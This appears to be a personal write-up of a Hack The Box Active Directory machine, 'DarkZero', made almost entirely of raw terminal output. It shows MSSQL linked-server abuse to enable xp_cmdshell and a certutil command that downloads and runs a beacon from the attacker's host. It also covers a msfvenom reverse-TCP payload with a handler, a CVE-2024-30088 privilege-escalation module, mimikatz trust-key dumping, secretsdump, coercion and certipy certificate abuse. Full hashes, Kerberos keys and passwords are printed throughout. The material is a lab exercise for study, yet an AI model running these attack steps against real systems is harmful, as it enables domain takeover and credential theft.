
```python
kali@kali ~> nmap -sC -sV 10.129.97.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 16:35 UTC
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.95% done; ETC: 16:37 (0:00:00 remaining)
Nmap scan report for DC01.darkzero.htb (10.129.97.151)
Host is up (0.061s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 23:36:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-08T23:37:24+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.97.151:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-08T23:17:50
|_Not valid after:  2055-10-08T23:17:50
| ms-sql-info: 
|   10.129.97.151:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-08T23:36:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

```


```python
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   

```


```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   

```



```python
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> 
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql   

NULL                   

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell ipconfig
output                                                 
----------------------------------------------------   
NULL                                                   

Windows IP Configuration                               

NULL                                                   

NULL                                                   

Ethernet adapter Ethernet:                             

NULL                                                   

   Connection-specific DNS Suffix  . :                 

   IPv4 Address. . . . . . . . . . . : 172.16.20.2     

   Subnet Mask . . . . . . . . . . . : 255.255.255.0   

   Default Gateway . . . . . . . . . : 172.16.20.1     

NULL                                                   
```


```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -split -f "http://10.10.14.176:8000/beacon.exe" "C:\Windows\Temp\file.exe"'; 
output                                                
---------------------------------------------------   
****  Online  ****                                    

  000000  ...                                         

  050400                                              

CertUtil: -URLCache command completed successfully.   

NULL                                                  

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> EXEC xp_cmdshell "C:\Windows\Temp\file.exe"'; 
ERROR(DC02): Line 1: Unclosed quotation mark after the character string ';'.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> EXEC xp_cmdshell "C:\Windows\Temp\file.exe"; 

```



```
[08/10 19:13:07] new [33002388] beacon > shell poc.exe
[08/10 19:13:07] [*] Task: create new process
[08/10 19:13:07] [*] Agent called server, sent [60 bytes]
[08/10 19:13:07] [+] Program C:\Windows\System32\cmd.exe /c poc.exe started with PID 2324 (output - with output)
```


https://github.com/tykawaii98/CVE-2024-30088

```
msf6 > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 LPORT=4444 -f exe -o /tmp/evil_x64.exe
[*] exec: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 LPORT=4444 -f exe -o /tmp/evil_x64.exe                                                                                                                         
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.                                                                                                                                                             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                                                                      
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                                                                  
No encoder specified, outputting raw payload                                                                                                                                                                                                
Payload size: 510 bytes                                                                                                                                                                                                                     
Final size of exe file: 7168 bytes                                                                                                                                                                                                          
Saved as: /tmp/evil_x64.exe                                                                                                                                                                                                                
```


```
msf6 > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 LPORT=4444 -f exe -o /tmp/evil_x64.exe
[*] exec: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 LPORT=4444 -f exe -o /tmp/evil_x64.exe                                                                                                                         
                                                                                                                                                                                                                                            
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.                                                                                                                                                             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                                                                      
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                                                                  
No encoder specified, outputting raw payload                                                                                                                                                                                                
Payload size: 510 bytes                                                                                                                                                                                                                     
Final size of exe file: 7168 bytes                                                                                                                                                                                                          
Saved as: /tmp/evil_x64.exe                                                                                                                                                                                                                 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > setg LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > setg LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.176:4444 
[*] Sending stage (203846 bytes) to 10.129.251.173
[*] Meterpreter session 1 opened (10.10.14.176:4444 -> 10.129.251.173:52664) at 2025-10-10 01:09:09 +0000
meterpreter > bg
[*] Backgrounding session 1...

```

```python
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.176     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set exitfunc process
exitfunc => process
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > exploit
[-] Msf::OptionValidateError The following options failed to validate: SESSION.
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set session 3
session => 3
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > exploit
[*] Started reverse TCP handler on 10.10.14.176:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 3296...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 788
[+] Successfully retrieved winlogon pid: 600
[*] Sending stage (203846 bytes) to 10.129.97.151
[*] Meterpreter session 7 opened (10.10.14.176:4444 -> 10.129.97.151:57200) at 2025-10-08 19:42:07 +0000

meterpreter > help
```




```
[10/08 19:47:25] beacon> hashdump
[10/08 19:47:25] [*] Tasked beacon to dump hashes
[10/08 19:47:25] [+] host called home, sent: 83198 bytes
[10/08 19:47:26] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```


```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::                                                
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC                                  
darkzero-ext\DC02$:aes256-cts-hmac-sha1-96:fd92bfbfbc948bef1d1a04f7c342ca606b0eb72023a421b05a80561fbf3b28e2                                         
darkzero-ext\DC02$:aes128-cts-hmac-sha1-96:1bd1d05e0abf42edc09e0c0064c010d3
darkzero-ext\DC02$:des-cbc-md5:d9baa423ba7fa49e
darkzero-ext\DC02$:plain_password_hex:a8e19b6a345f5fd4105c5e66c353eddd7b57011dabb7aed711ca8549fc3b512b129ae66519ff5143b9ea9e5072394d69115a9d063679413117e4dad23876cd52aa462a08bb4138238e3bdc01e273831c14b3f22027033efdc734295baf307611e5a19f
55d5eb5808c1a690a028b19dbe0ca6ef4d75fe864f9103815005fce41bd754601e5525da29b92001ec175c8cc53188efbf6806114bb27ab2f28e6737ed82abd5e1c883f02b65d62c34c2659c8fe8d8190b48231db9a54e2f944145ebf9e70a260da93c64052ccefe55ff639f26ebe2470e46258e46b6
dddf69d3bdfa8f9d387c951a8cc6ab3e725839b730538f                                                                                                                                                                                              
darkzero-ext\DC02$:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::                                                                                                                                                     
[*] DPAPI_SYSTEM                 
dpapi_machinekey:0x6bcc47f3d350e3e1d7f13424e11a8c457889315e        
dpapi_userkey:0x1854519755efff0a15b5e2cea6b26e9527d31695
[*] NL$KM                                                                                                                                                                                                                                   
 0000   92 C6 99 E2 E4 7A 16 52  2D 2B C3 98 BF 82 CF D1   .....z.R-+......                                                                                                                                                                 
 0010   9F 53 D9 7B 55 B2 83 9A  F9 CA 23 8F 23 A2 D2 54   .S.{U.....#.#..T                                                                                                                                                                 
 0020   D9 0B 9C D4 6A 4F A3 B9  B5 86 4D FF 47 49 34 46   ....jO....M.GI4F                                                                                                                                                                 
 0030   07 06 E7 38 69 E3 8F 35  09 5D 55 5B 88 A9 99 8C   ...8i..5.]U[....                                                                                                                                                                 
NL$KM:92c699e2e47a16522d2bc398bf82cfd19f53d97b55b2839af9ca238f23a2d254d90b9cd46a4fa3b9b5864dff474934460706e73869e38f35095d555b88a9998c
[*] _SC_MSSQLSERVER                                                                                                                                                                                                                         
darkzero-ext\svc_sql:enTRanDiVec!                                                                                                                                                                                                           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                               
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3a9616ace37521e8a05bcaf6c68e3bbf44adfc7aa997b6123b7da6e39f7d0b3c
Administrator:aes128-cts-hmac-sha1-96:5da4b74154944739351c6da76d657a7d
Administrator:des-cbc-md5:ad1c6ec1df64a1e0
krbtgt:aes256-cts-hmac-sha1-96:e1b65b38be61373cad5930ace5bb65161460324e0c42c0ea14a73e4ac2314f4c
krbtgt:aes128-cts-hmac-sha1-96:133d768fd3a1214bba00fec89d2e56c1
krbtgt:des-cbc-md5:d04f0b3d3b385b31
svc_sql:aes256-cts-hmac-sha1-96:b4a17d13e0dabc6423bcf9629ce0214aa5ea2702b4e816a67fbb3348f758ae45
svc_sql:aes128-cts-hmac-sha1-96:8d8760f86117a15e7cae334f3d4df5a4
svc_sql:des-cbc-md5:434f1538b38c2361
DC02$:aes256-cts-hmac-sha1-96:fd92bfbfbc948bef1d1a04f7c342ca606b0eb72023a421b05a80561fbf3b28e2
DC02$:aes128-cts-hmac-sha1-96:1bd1d05e0abf42edc09e0c0064c010d3
DC02$:des-cbc-md5:bf926ea2ce765d46
darkzero$:aes256-cts-hmac-sha1-96:b4a3771e8ba1454a061750b55afc6cf59d4955309cf3ebeeee5717349f28356a
darkzero$:aes128-cts-hmac-sha1-96:3bf339d64e3abcb2b511e1b58d531f7d
darkzero$:des-cbc-md5:850851f1b3d638b0
```


```
[09/10 04:31:35] new [b5bb07b9] beacon > powershell c:\tmp\mimikatz.exe 'lsadump::trust /patch'
[09/10 04:31:35] [*] Task: create new process
[09/10 04:31:36] [*] Agent called server, sent [126 bytes]
[09/10 04:31:36] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c c:\tmp\mimikatz.exe 'lsadump::trust /patch' started with PID 2168 (output - with output)
[09/10 04:31:40] [+] Job [b5bb07b9] output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::trust /patch

Current domain: DARKZERO.EXT (darkzero-ext / S-1-5-21-1969715525-31638512-2552845157)

Domain: DARKZERO.HTB (darkzero / S-1-5-21-1152179935-589108180-1989892463)
 [  In ] DARKZERO.EXT -> DARKZERO.HTB
    * 9/29/2025 11:25:18 AM - CLEAR   - a0 67 5a 80 37 bb f8 07 7b 07 77 b6 1b 8e a6 b3 d2 49 0b 9c ac 9c 9a b2 00 35 1e 64 c7 8d a4 48 ec cf 46 7a 8c 2c b1 c6 ee 6c e2 f0 1c b2 41 f2 df ea 98 e7 cd 8c a9 e5 37 5e 26 c6 d1 19 74 3a 05 fa 87 2f e9 29 eb f4 42 2d b4 4e f5 f0 53 89 b9 d2 4e 2d f2 a3 36 ad 17 3e 9d 91 d8 25 19 44 d5 27 e8 22 b6 23 f2 05 f8 46 c4 60 97 dd fd d8 82 25 4d 72 8a a6 ef 6e f7 94 b1 5e 65 9c a7 41 05 4f 80 a8 7d ca 85 a3 cc 25 dc c0 04 2d d8 73 14 dc d1 42 74 04 43 34 28 4b 6b 9d a1 0d 57 44 78 f3 01 99 ba f9 d1 02 d8 20 06 b9 21 c0 78 76 c9 71 4d 78 b5 d7 8a 4a b7 48 9c ae 6d 91 cc ac 9e b3 ee 8f ed d6 88 2f 6c 5c f9 d1 80 cc 1a 2a 43 c1 ae 2d 1d 33 2d fe be c9 18 52 d1 08 2c 30 7d 49 21 48 72 6f c2 f3 f7 5a 16 bf d7 7f 35 54 
	* aes256_hmac       e3d16e9a18a3abc282ce8b07b8248ba903ee0a85b3b75d4143896d80d98c4293
	* aes128_hmac       5e2c333c8734bb024265a3e7dfb014c0
	* rc4_hmac_nt       4276fdf209008f4988fa8c33d65a2f94

 [ Out ] DARKZERO.HTB -> DARKZERO.EXT
    * 9/22/2025 12:02:38 PM - CLEAR   - c2 f5 b7 bd 92 f7 67 47 42 76 31 1e a1 c1 cb 2b 43 27 3f 3b 51 89 b4 cb 55 75 76 40 51 f9 f4 3a 4b 5c 3b 35 88 27 33 d0 77 26 64 60 63 23 03 4a 9a c0 1d 29 14 04 ad 03 48 fb 3e 76 47 f8 66 d9 15 6c 08 28 c9 52 07 d0 cf 79 88 8b 45 16 a1 d6 cc 4b 1b b2 7c 73 e7 7b c9 73 2d aa 5a c2 c5 8f 25 2d 83 8f 21 6e 4a 96 04 dd 32 2f 61 23 cd e1 71 7a 24 bd aa ae 4d e1 a0 c0 f0 63 89 90 99 fb d1 f8 73 9e 08 df fe b2 bd 35 e5 ed bb 1f ee 4b bf a6 98 35 45 cc 19 57 b8 a3 be 5a 64 32 67 b4 71 5d 5a 9a 53 9b 3a 12 3f b6 7f 5c 2f fa aa c9 77 94 1b c8 7e b4 79 d0 9a a9 26 60 74 79 e6 39 c4 21 bc 54 6e f1 e6 25 a5 da 5d 44 f9 64 d1 aa 39 67 b9 cd 1d fa c1 2f 32 f8 cf 31 2f bb 1b 5e fb 20 65 e8 c4 ca 1a 11 18 45 51 4c 3c 19 41 58 
	* aes256_hmac       8c7b7595f340c8811f6bf2fdda35d0e9f670c347b177bd6e590d39c11c137d74
	* aes128_hmac       d635f53a9201a6e23fa898a4bab41ef8
	* rc4_hmac_nt       95e4ba6219aced32642afa4661781d4b

 [ In-1] DARKZERO.EXT -> DARKZERO.HTB
    * 7/29/2025 8:30:19 AM - CLEAR   - 55 00 4e 00 75 00 3d 00 6e 00 75 00 45 00 59 00 5b 00 77 00 74 00 7c 00 56 00 42 00 74 00 
	* aes256_hmac       97951af794202832ceab4ace1d62d3ccce27cac92b1cb34c29abbb54d52fdcb2
	* aes128_hmac       8d9f5b88a526863f2e5c2dbd7937341f
	* rc4_hmac_nt       4e1e0cb1a5c28010572b3d725e9a164e

 [Out-1] DARKZERO.HTB -> DARKZERO.EXT
    * 9/22/2025 12:02:38 PM - CLEAR   - 55 00 4e 00 75 00 3d 00 6e 00 75 00 45 00 59 00 5b 00 77 00 74 00 7c 00 56 00 42 00 74 00 
	* aes256_hmac       afcd2ae4306b690a2785aadcd8757890e48a0e82635b358c3b19469f65d312dc
	* aes128_hmac       6bdcabcdbf7919f8db95d40d6f14f537
	* rc4_hmac_nt       4e1e0cb1a5c28010572b3d725e9a164e

```




```
kali@kali ~> mssqlclient.py 'john.w':'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\
subdirectory   depth   file   
------------   -----   ----   
```



```
[*] 10/9/2025 9:23:51 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB  <------------
  StartTime             :  10/9/2025 5:23:46 AM
  EndTime               :  10/9/2025 3:23:45 PM
  RenewTill             :  10/15/2025 9:21:40 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :


doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZgI0xSR/yDnC2zkxOMJwXReaPbrskJjhcDsljN+9DmVaOTqxWPjtB/lE6tZYHq82F[...]LWkVSTy5IVEI=

```


```
kali@kali ~> nxc smb DC01.darkzero.htb --use-kcache
SMB         DC01.darkzero.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         DC01.darkzero.htb 445    DC01             [+] DARKZERO.HTB\DC01$ from ccache 

```


```
kali@kali ~> secretsdump.py dc01.darkzero.htb -k -no-pass
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up... 

```

----

## Optimizing myself

- what does petitpotam do
	- Co-erces authentication
- ceritpy 
	- auth
	- req
- where does petitpotam get blocked
	- pipes getting blocked
- nxc also works
	- you could also 
- for OPSEC Safety
	- run DNS and point it to yourself
	- so that you can catch the ticket


```
nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=DC02.darkzero.ext
```

for certipy

```
kali@kali ~/b/htb> certipy req -u 'administrator' -k -no-pass -target DC01.darkzero.htb -ca 'darkzero-DC01-CA' -template 'User' -dc-ip 10.129.251.173 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@darkzero.htb'
[*] Certificate object SID is 'S-1-5-21-1152179935-589108180-1989892463-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'


kali@kali ~/b/htb> certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.251.173'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@darkzero.htb'
[*]     Security Extension SID: 'S-1-5-21-1152179935-589108180-1989892463-500'
[*] Using principal: 'administrator@darkzero.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@darkzero.htb': aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726

```



![[Note-20251009175346572.webp]]